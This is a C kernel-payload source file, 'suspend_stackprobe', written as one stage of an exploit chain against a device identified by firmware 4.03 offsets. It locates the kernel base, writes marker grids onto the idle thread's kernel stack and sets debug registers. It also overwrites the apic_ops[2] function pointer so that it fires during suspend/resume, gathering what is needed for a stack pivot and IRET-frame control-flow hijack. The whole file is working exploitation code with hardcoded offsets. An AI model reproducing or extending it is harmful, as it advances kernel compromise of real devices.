#include <stdint.h>

/*
 * suspend_stackprobe v1 — Determine resume stack state for pivot planning
 *
 * GOAL: Find exactly where RSP is when apic_ops[2] is called during
 * resume, so we can plan the pop_all_iret IRET frame placement.
 *
 * STRATEGY: Two-phase approach.
 *
 * Phase 1 (pre-suspend, runs immediately):
 *   - Read pcpu[0].idlethread->td_pcb->pcb_rsp (saved RSP from last switch)
 *   - Read the idle thread's kernel stack boundaries
 *   - Write a grid of marker qwords across the idle thread's stack
 *     at 64-byte intervals covering the top 2048 bytes
 *   - Write markers to kdata_base + 0x200 region (persistence control)
 *   - Set apic_ops[2] to get_timer_freq (safe, survives resume)
 *   - Record all addresses and original values
 *
 * Phase 2 (post-resume, deploy readback payload):
 *   - Use fw_ver=0x2 mode to readback without re-arming
 *   - Read the marker grid from the idle stack
 *   - Markers overwritten by the resume code reveal the stack region used
 *   - The boundary between intact and clobbered markers shows RSP depth
 *
 * Additionally: write debug register sentinels to DR0-DR3 before suspend
 * to test if debug registers persist through suspend/resume.
 *
 * Modes (via fw_ver):
 *   0x403: Mode 0 — ARM: write markers + set apic_ops[2] + write DRs
 *   0x2:   Mode 2 — READBACK: read markers + read DRs + restore apic_ops
 *
 * Output layout for Mode 0 (ARM):
 *   [0]   magic "SKPR" (0x534B5052) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   idle_kstack_base
 *   [4]   idle_kstack_pages
 *   [5]   idle_pcb_rsp (saved RSP from last context switch)
 *   [6]   idle_pcb_rip (saved RIP from last context switch)
 *   [7]   marker_grid_start (lowest address with markers)
 *   [8]   marker_grid_end (highest address with markers)
 *   [9]   marker_count
 *   [10]  marker_spacing (bytes between markers)
 *   [11]  apic_ops_addr
 *   [12]  orig_xapic_mode
 *   [13]  new_xapic_mode (get_timer_freq)
 *
 *   [14..45] marker original values (32 markers max)
 *   [46..77] marker written values
 *
 *   [78]  DR0 written value (sentinel)
 *   [79]  DR1 written value
 *   [80]  DR2 written value
 *   [81]  DR3 written value
 *
 *   [82]  kdata control marker addr (kdata_base + 0x200)
 *   [83]  kdata control marker value
 *
 *   [100] sentinel 0xdeadbeefcafe0023
 *
 * Output layout for Mode 2 (READBACK):
 *   [0]   magic "SKPR" (0x534B5052) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *
 *   [3..34] marker current values (read back from idle stack)
 *   [35]  marker_count
 *   [36]  first_clobbered_index (-1 if none)
 *   [37]  last_clobbered_index (-1 if none)
 *   [38]  estimated_rsp_at_call (from clobber boundary)
 *
 *   [39]  DR0 readback
 *   [40]  DR1 readback
 *   [41]  DR2 readback
 *   [42]  DR3 readback
 *   [43]  DR0 match (1=survived, 0=clobbered)
 *
 *   [44]  kdata control marker readback
 *   [45]  kdata control match (1=survived)
 *
 *   [46]  apic_ops[2] readback (should still be get_timer_freq)
 *   [47]  apic_ops[2] original (restored value)
 *
 *   [100] sentinel 0xdeadbeefcafe0024
 */

#define MAGIC_SKPR       0x534B5052  /* "SKPR" */

/* FW 4.03 offsets */
#define PCPU_ARRAY_OFF   0x64d2280
#define APIC_OPS_OFF_FROM_KTEXT  0x1934AC8

/* pcpu / thread / PCB offsets */
#define PC_IDLETHREAD    0x08
#define TD_KSTACK        0x2a8
#define TD_KSTACK_PAGES  0x2b0
#define TD_PCB           0x3f8
#define PCB_RSP          0x28
#define PCB_RIP          0x38

/* Marker grid parameters */
#define MARKER_COUNT     32
#define MARKER_SPACING   64   /* bytes between markers */
#define GRID_SIZE        (MARKER_COUNT * MARKER_SPACING)  /* 2048 bytes */

/* DR sentinel values */
#define DR0_SENTINEL     0x5354414B50524F42ULL  /* "STAKPROB" */
#define DR1_SENTINEL     0x4452314452314452ULL  /* "DR1DR1DR" */
#define DR2_SENTINEL     0x4452324452324452ULL  /* "DR2DR2DR" */
#define DR3_SENTINEL     0x4452334452334452ULL  /* "DR3DR3DR" */

/* kdata control marker */
#define KDATA_CTRL_OFF   0x200
#define KDATA_CTRL_VAL   0x4B44415441435452ULL  /* "KDATACTR" */

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

static void mode0_arm(uint64_t kdata_base, volatile uint64_t* out, volatile uint32_t* out32)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_FROM_KTEXT;
    volatile uint64_t* apic_table = (volatile uint64_t*)apic_ops_addr;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);
    uint64_t idle_kstack = read8(idlethread + TD_KSTACK);
    uint64_t idle_pages  = read8(idlethread + TD_KSTACK_PAGES);
    uint64_t idle_pcb    = read8(idlethread + TD_PCB);
    uint64_t pcb_rsp     = read8(idle_pcb + PCB_RSP);
    uint64_t pcb_rip     = read8(idle_pcb + PCB_RIP);

    uint64_t stack_top = idle_kstack + idle_pages * 4096;

    /* Marker grid: cover top GRID_SIZE bytes of idle stack */
    uint64_t grid_start = stack_top - GRID_SIZE;
    uint64_t grid_end   = stack_top;

    /* Header */
    out32[0] = MAGIC_SKPR;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = idle_kstack;
    out[4] = idle_pages;
    out[5] = pcb_rsp;
    out[6] = pcb_rip;
    out[7] = grid_start;
    out[8] = grid_end;
    out[9] = MARKER_COUNT;
    out[10] = MARKER_SPACING;
    out[11] = apic_ops_addr;
    out[12] = apic_table[2];          /* original xapic_mode */
    out[13] = apic_table[19];         /* get_timer_freq (will use as target) */

    /* Save original values at marker positions and write markers */
    for (int i = 0; i < MARKER_COUNT; i++) {
        uint64_t addr = grid_start + (i * MARKER_SPACING);
        uint64_t orig = read8(addr);
        out[14 + i] = orig;                         /* save original */
        uint64_t marker = 0x4D41524B00000000ULL | (uint64_t)i;  /* "MARK\0\0\0\0" | idx */
        out[46 + i] = marker;                       /* record written value */
        write8(addr, marker);                        /* write to idle stack */
    }

    /* Set debug register sentinels */
    __asm__ volatile("mov %0, %%dr0" :: "r"(DR0_SENTINEL));
    __asm__ volatile("mov %0, %%dr1" :: "r"(DR1_SENTINEL));
    __asm__ volatile("mov %0, %%dr2" :: "r"(DR2_SENTINEL));
    __asm__ volatile("mov %0, %%dr3" :: "r"(DR3_SENTINEL));

    out[78] = DR0_SENTINEL;
    out[79] = DR1_SENTINEL;
    out[80] = DR2_SENTINEL;
    out[81] = DR3_SENTINEL;

    /* kdata control marker */
    uint64_t ctrl_addr = kdata_base + KDATA_CTRL_OFF;
    write8(ctrl_addr, KDATA_CTRL_VAL);
    out[82] = ctrl_addr;
    out[83] = KDATA_CTRL_VAL;

    /* Arm apic_ops[2] with get_timer_freq (safe ktext func) */
    uint64_t get_timer_freq = apic_table[19];
    apic_table[2] = get_timer_freq;

    out[100] = 0xdeadbeefcafe0023ULL;

    /* Armed */
    out32[1] = 0x0001;
}

static void mode2_readback(uint64_t kdata_base, volatile uint64_t* out, volatile uint32_t* out32)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_FROM_KTEXT;
    volatile uint64_t* apic_table = (volatile uint64_t*)apic_ops_addr;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);
    uint64_t idle_kstack = read8(idlethread + TD_KSTACK);
    uint64_t idle_pages  = read8(idlethread + TD_KSTACK_PAGES);
    uint64_t stack_top = idle_kstack + idle_pages * 4096;
    uint64_t grid_start = stack_top - GRID_SIZE;

    /* Header */
    out32[0] = MAGIC_SKPR;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;

    /* Read back marker grid from idle stack */
    int first_clobbered = -1;
    int last_clobbered = -1;

    for (int i = 0; i < MARKER_COUNT; i++) {
        uint64_t addr = grid_start + (i * MARKER_SPACING);
        uint64_t val = read8(addr);
        out[3 + i] = val;

        uint64_t expected = 0x4D41524B00000000ULL | (uint64_t)i;
        if (val != expected) {
            if (first_clobbered < 0)
                first_clobbered = i;
            last_clobbered = i;
        }
    }

    out[35] = MARKER_COUNT;
    out[36] = (uint64_t)(int64_t)first_clobbered;
    out[37] = (uint64_t)(int64_t)last_clobbered;

    /* Estimate RSP: the first clobbered marker indicates the stack grew
     * down to (at least) that address. RSP was at or below that marker. */
    if (first_clobbered >= 0) {
        out[38] = grid_start + (first_clobbered * MARKER_SPACING);
    } else {
        out[38] = 0;  /* no markers clobbered — stack didn't touch our grid */
    }

    /* Read back debug registers */
    uint64_t dr_val;
    __asm__ volatile("mov %%dr0, %0" : "=r"(dr_val));
    out[39] = dr_val;
    __asm__ volatile("mov %%dr1, %0" : "=r"(dr_val));
    out[40] = dr_val;
    __asm__ volatile("mov %%dr2, %0" : "=r"(dr_val));
    out[41] = dr_val;
    __asm__ volatile("mov %%dr3, %0" : "=r"(dr_val));
    out[42] = dr_val;

    /* Check if DR0 survived */
    out[43] = (out[39] == DR0_SENTINEL) ? 1 : 0;

    /* Read back kdata control marker */
    uint64_t ctrl_val = read8(kdata_base + KDATA_CTRL_OFF);
    out[44] = ctrl_val;
    out[45] = (ctrl_val == KDATA_CTRL_VAL) ? 1 : 0;

    /* Read and restore apic_ops[2] */
    out[46] = apic_table[2];  /* current value (should be get_timer_freq) */

    /* Restore original xapic_mode (slot 2 original is at ktext+0x294340) */
    /* We can identify it: it's the value closest to the other apic_ops entries */
    /* For safety, read apic_table[18] (set_tpr) which is near xapic_mode */
    /* Original xapic_mode = ktext + 0x294340, set_tpr = ktext + 0x294348 */
    /* So original = set_tpr - 8 */
    uint64_t set_tpr = apic_table[18];
    uint64_t orig_xapic = set_tpr - 8;
    apic_table[2] = orig_xapic;
    out[47] = orig_xapic;

    out[100] = 0xdeadbeefcafe0024ULL;

    /* Done */
    out32[1] = 0x0001;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;  /* MUST read before zeroing — out IS args! */
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 280; i++)
        out[i] = 0;

    if (mode == 0x403) {
        mode0_arm(kdata_base, out, out32);
    } else if (mode == 0x2) {
        mode2_readback(kdata_base, out, out32);
    } else {
        /* Unknown mode — just report error */
        out32[0] = MAGIC_SKPR;
        out32[1] = 0xFF;
        out[1] = kdata_base;
        out[100] = 0xdeadbeefcafe0025ULL;
    }

    return 0;
}
